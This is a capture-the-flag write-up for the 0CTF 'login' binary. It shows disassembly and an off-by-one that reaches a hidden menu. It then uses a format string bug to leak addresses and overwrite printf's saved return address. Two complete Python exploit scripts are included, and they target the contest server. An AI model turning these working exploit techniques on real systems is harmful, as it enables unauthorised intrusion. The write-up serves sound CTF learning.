### Solved by barrebas

`login` was a 64-bit ELF. Quickly checking what I was up against with `gdb-peda`:

```bash
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL
```

Oops. This looks like fun! The description said to login as guest, and login as root. Together with the output of `strings`, this allowed me to bypass the first login:

```bash
Login: guest
Password: guest123
== 0CTF Login System ==
1. Show Profile
2. Login as User
3. Logout
=======================
Your choice: 1
Username: guest
Level: Guest
```

Now, we're presented with three choices. With `2`, we can change our username and view it with `1`. However, this was not vulnerable to overflows or format string vulnerabilities. I dug into the menu system, looking for hidden things, and indeed:

```
;;; print_menu and get_choice
1265: call   ddd <open@plt+0x24d>   
126a: mov    DWORD PTR [rbp-0x4],eax
126d: mov    eax,DWORD PTR [rbp-0x4]
1270: cmp    eax,0x2
1273: je     1299 <open@plt+0x709>
1275: cmp    eax,0x2
1278: jg     1281 <open@plt+0x6f1>
127a: cmp    eax,0x1
127d: je     128d <open@plt+0x6fd>
127f: jmp    12e3 <open@plt+0x753>
1281: cmp    eax,0x3
1284: je     12a5 <open@plt+0x715>
1286: cmp    eax,0x4                ; AHA! Secret entry
1289: je     12b8 <open@plt+0x728>  ; Jump to 12b8
128b: jmp    12e3 <open@plt+0x753>
128d: mov    eax,0x0
1292: call   f24 <open@plt+0x394>
1297: jmp    12f0 <open@plt+0x760>
1299: mov    eax,0x0
129e: call   f7a <open@plt+0x3ea>
12a3: jmp    12f0 <open@plt+0x760>
12a5: lea    rdi,[rip+0x246]        # 14f2 <open@plt+0x962>
12ac: call   a90 <puts@plt>
12b1: mov    eax,0x0
12b6: jmp    12f5 <open@plt+0x765>

;;; choice 4
12b8: lea    rax,[rip+0x200d81]     ; rax points to our provided username (e.g. 'root')
12bf: mov    eax,DWORD PTR [rax+0x100]  ; check this flag... starts off as 0x1
12c5: test   eax,eax
12c7: jne    12d5 <open@plt+0x745>
```

So we need to bypass this secret menu and make sure that the flag is set to `0x00`. As I said, `rax` points to our input, and the flag comes 256 bytes after that. It starts out as 1 and we need to make it zero... we're looking for an off-by-one! This is present in the `input username` function, allowing the reset of the flag and entering the secret login menu:

```
Login: guest
Password: guest123
== 0CTF Login System ==
1. Show Profile
2. Login as User
3. Logout
=======================
Your choice: 2
Enter your new username:
HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH
Done.
== 0CTF Login System ==
1. Show Profile
2. Login as User
3. Logout
=======================
Your choice: 4
Login: root
Password: toor
root login failed.
1 chance remaining.
Login: %llp
Password: bleh
0x7f13e2689490 login failed.
Threat detected. System shutdown.
```

I won't show the disassembly, but just describe what happens. Locally, the binary takes the md5 of our supplied password, but compares it to `0ops{secret_md5}`. If it matches, it calls a function to dump the flag. I figured the remote binary would contain the real md5, so I needed a way to read from the process remotely. The vulnerability to do so was found soon enough, it's a format string vulnerability. We get two chances. I used the first to leak a stack address and an address of the binary (because of PIE, it's loaded at a different address each time). The second printf call is then used to leak the md5 to which our supplied password is compared. 

Easy, right? Wrong. The remote binary returned the same string, `0ops{secret_md5}`. Obviously, I had to find another way to break this binary. 

The Nitty Gritty
----------------

I tried overwriting a GOT pointer with the format string vulnerability, but failed: the GOT section was marked read-only! I looked for other ways to gain control of execution or making the `memcmp` succeed, but could only come up with one thing: overwriting the saved return address of the second printf call.

```
11d9: lea    rsi,[rip+0x2b5]       ; 'secret_MD5' --> same remotely :?
11e0: mov    rdi,rax
11e3: call   b70 <memcmp@plt>
11e8: test   eax,eax
11ea: jne    11f8 <open@plt+0x668>
11ec: mov    eax,0x0
11f1: call   fb3 <open@plt+0x423>
11f6: jmp    122e <open@plt+0x69e>
11f8: lea    rax,[rbp-0x210]
11ff: mov    rdi,rax
1202: mov    eax,0x0
1207: call   a70 <printf@plt>      ; second printf call; overwrite saved ret addr using format string vuln
120c: lea    rdi,[rip+0x293]        # 14a6 <open@plt+0x916>
1213: call   a90 <puts@plt>
1218: lea    rdi,[rip+0x2b1]        # 14d0 <open@plt+0x940>
121f: call   a90 <puts@plt>
1224: mov    edi,0x1
1229: call   aa0 <exit@plt>
```

I found a nice, stable stack pointer that I could leak, calculated the offset to the location of the saved return address and plugged it in a poc script. Locally, it gave me the flag! I quickly tried it remotely, but it failed miserably. Turns out the layout of the stack was different; the leaked stack pointer was at a different location. Furthermore, the offset from other leaked stack addresses to the saved return address of the second printf was different. Back to the drawing board?

Some luck involved
------------------

I spent some time trying to locate other stack addresses that I could leak and gave me a nice, stable way to calculate the location of the saved return address. I had a way to leak the binary address, meaning I could calculate the exact return address. I then started brute-forcing stack pointers and using the second printf to dump the memory from the stack. Using this, I was looking for the correct return address. Because I was fed up with it and it was late, I had forgotten to remove a certain constant from the poc that I used locally. 

```python
from socket import *
import struct, telnetlib, re, sys

def readtil(delim):
    buf = b''
    while not e in buf:
        buf += s.recv(1)
    return buf

def sendln(b):
    s.send(b + b'\n')

def sendbin(b):
    s.sendall(b)

def q(x):
    return struct.pack('<Q', x)

def pwn():
    global s
    s=socket(AF_INET, SOCK_STREAM)
    #s.connect(('localhost', 6666))
    s.connect(('202.112.26.107', 10910))
    
    raw_input()
    
    readtil('Login: ')
    sendln('guest')
    readtil('Password: ')
    sendln('guest123')
    readtil('choice: ')
    sendln('2')
    readtil('username:')
    sendln("A"*256)     # overflow userflag
    readtil('choice: ')
    sendln('4')         # secret login menu
    
    ### first format string vuln to read stack addr
    readtil('Login: ')
    # leak both binary address and stack address
    sendln('%1$lp-%'+sys.argv[1]+'$lp')
    readtil('Password: ')
    sendln('bleh')
    data = readtil('login failed.')
    
    m = re.findall(r'([a-f0-9]{5,})', data)
    # find stack addr:
    stack_addr = int(m[1], 16) 
    base_addr = int(m[0], 16) - 0x1490
    
    print "[+] Leaked address of base: {}".format(hex(base_addr))
    print "[+] Leaked address of stack: {}".format(hex(stack_addr))
    
    readtil('Login: ')
    
    sendln('AAAAAAABBBC%10$s'+q(stack_addr-504))    # this offset of 504 was found locally and seems to be correct for remote, too
    
    readtil('Password: ')
    sendln('bleh')
    data = s.recv(1000)
    print data 
    print hex(struct.unpack('<Q', data[len('AAAAAAABBBC'):len('AAAAAAABBBC')+6]+b"\x00\x00")[0])
    print "you're looking for {}".format(hex(base_addr + 0x120c))
    
    # check if the stack location contains the right return address
    if (struct.unpack('<Q', data[len('AAAAAAABBBC'):len('AAAAAAABBBC')+6]+b"\x00\x00")[0]) == (base_addr + 0x120c):
        print "Found at {}".format(sys.argv[1])
        raw_input()
        
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

    s.close()

pwn()
```

Note: the exact layout of the format string is chosen such that the stack address is overlapping with an actuall address on the stack. Because we can't send null-bytes, if we overwrite something else, the pointer would be mangled:

```
before: 0xdeadbeef 0xcafebabe
after:  0x504ddb66 0x7fff00be -> stack address is invalid, pointing to 0xbe007fff....

should be:

before: 0xdeadbeef 0xcafe0000
after:  0x504ddb66 0x7fff0000 -> properly set stack address
```

Locally, I identified both the arguments 15 and 41 (in the first format string vuln) to contain the right stack address. Remotely, these contained something different. However, I simply increased the number until I hit 43: this address, combined with the offset, contained the return address! I definitely lucked out after banging my head against the challenge for a few hours.

Hitting the jackpot
-------------------

```bash
$ python poc.py 43

[+] Leaked address of base: 0x7f48589d5000
[+] Leaked address of stack: 0x7fffb65656b0
[+] Offset format string with 24497 bytes
AAAAAAABBBC
           b.XH..TV...
0x7f48589d620c
you're looking for 0x7f48589d620c
Found at 43
```

Armed with the correct stack address, I could now trivially overwrite two bytes of the saved return address so that it points to the function that read the flag and dumps it over the socket:

```python
from socket import *
import struct, telnetlib, re, sys

def readtil(delim):
    buf = b''
    while not delim in buf:
        buf += s.recv(1)
    return buf

def sendln(b):
    s.send(b + b'\n')

def sendbin(b):
    s.sendall(b)

def q(x):
    return struct.pack('<Q', x)

def pwn():
    global s
    s=socket(AF_INET, SOCK_STREAM)
    #s.connect(('localhost', 6666))
    s.connect(('202.112.26.107', 10910))
    
    #raw_input()
    
    readtil('Login: ')
    sendln('guest')
    readtil('Password: ')
    sendln('guest123')
    readtil('choice: ')
    sendln('2')
    readtil('username:')
    sendln("A"*256)     # overflow userflag
    readtil('choice: ')
    sendln('4')         # secret login menu
    
    
    ### first string format vuln to read stack addr
    readtil('Login: ')
    # 43 found by lucky bruteforcing in combination with the 504 below. locally, it's at 15 and 41
    sendln('%1$lp-%43$lp')
    readtil('Password: ')
    sendln('bleh')
    data = readtil('login failed.')
    
    m = re.findall(r'([a-f0-9]{5,})', data)
    # find stack addr:
    stack_addr = int(m[1], 16) 
    base_addr = int(m[0], 16) - 0x1490
    
    # base_addr was not necesssary in the final exploit, but was 
    # instrumental in finding the right offset!
    print "[+] Leaked address of base: {}".format(hex(base_addr))
    print "[+] Leaked address of stack: {}".format(hex(stack_addr))
    
    readtil('Login: ')
    
    # we need to return to base_addr + 0xfb3, because that function 
    # is designed to read the flag & spit it over the socket
    print_offset = (base_addr & 0xffff) + 0xfb3 - 2
    
    print "[+] Offset format string with {} bytes".format(print_offset)
    
    # send format string to overwrite saved return addr of 
    sendln('%' + "%05d" % print_offset +'c___%10$hn'+q(stack_addr-504)) # should point to ret_addr at stack
    
    readtil('Password: ')
    sendln('bleh')

    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

    s.close()

pwn()
```

Yes, it looks horrible, but it did drop the flag, scoring us another 300 points.
